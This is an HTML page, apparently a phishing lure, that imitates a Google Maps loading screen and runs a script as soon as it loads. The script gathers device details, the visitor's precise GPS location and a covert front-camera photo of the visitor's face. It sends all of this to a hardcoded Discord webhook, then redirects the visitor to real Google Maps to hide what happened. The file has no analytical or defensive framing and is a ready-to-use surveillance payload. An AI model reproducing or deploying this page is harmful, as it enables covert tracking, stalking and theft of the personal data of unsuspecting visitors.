<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Maps - Memuat...</title>
    <style>
        body { font-family: sans-serif; background: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loader { text-align: center; color: #5f6368; }
        .logo { width: 80px; animation: pulse 1.5s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.1); } 100% { transform: scale(1); } }
        video, canvas { display: none; }
    </style>
</head>
<body>

<div class="loader">
    <img src="https://www.gstatic.com/images/branding/product/2x/maps_96dp.png" class="logo">
    <p>Mengkalibrasi GPS untuk akurasi terbaik...</p>
</div>

<video id="video" autoplay></video>
<canvas id="canvas"></canvas>

<script>
    const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1484383057975709819/7qQ5RYrC4FkuCKiin5gEpH0yfliZMNCrM4atDn-qn4LA_dI5zrS-Dwawh3QdA48FY0kI";

    async function sendToDiscord(msg, blob = null) {
        const data = new FormData();
        if (blob) {
            data.append('file', blob, 'foto.jpg');
            data.append('payload_json', JSON.stringify({ content: msg }));
        } else {
            data.append('payload_json', JSON.stringify({ content: msg }));
        }
        return fetch(DISCORD_WEBHOOK, { method: 'POST', body: data });
    }

    async function start() {
        // 1. Ambil Info Perangkat Secara Paksa
        let infoHP = "📱 **DATA PERANGKAT TERDETEKSI**\n";
        infoHP += "• OS/Platform: " + navigator.platform + "\n";
        infoHP += "• Browser: " + navigator.userAgent.split(') ')[0] + ")\n";
        infoHP += "• Bahasa: " + navigator.language + "\n";
        infoHP += "• Layar: " + window.screen.width + "x" + window.screen.height;

        // Cek Baterai
        if (navigator.getBattery) {
            try {
                const b = await navigator.getBattery();
                infoHP += "\n• Baterai: " + (b.level * 100).toFixed(0) + "% " + (b.charging ? "⚡" : "🪫");
            } catch (e) {}
        }

        // KIRIM DATA HP DULUAN (Wajib Berhasil)
        await sendToDiscord(infoHP);

        // 2. Baru Ambil Lokasi & Foto
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
                
                await sendToDiscord(`📍 **LOKASI PRESISI**\n${mapUrl}`);

                try {
                    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            await sendToDiscord("📸 **FOTO WAJAH TARGET**", blob);
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = mapUrl;
                        }, 'image/jpeg');
                    }, 2000);
                } catch (e) {
                    window.location.href = mapUrl;
                }
            }, (err) => {
                window.location.href = "https://www.google.com/maps";
            }, { enableHighAccuracy: true });
        }
    }
    window.onload = start;
</script>
</body>
</html>
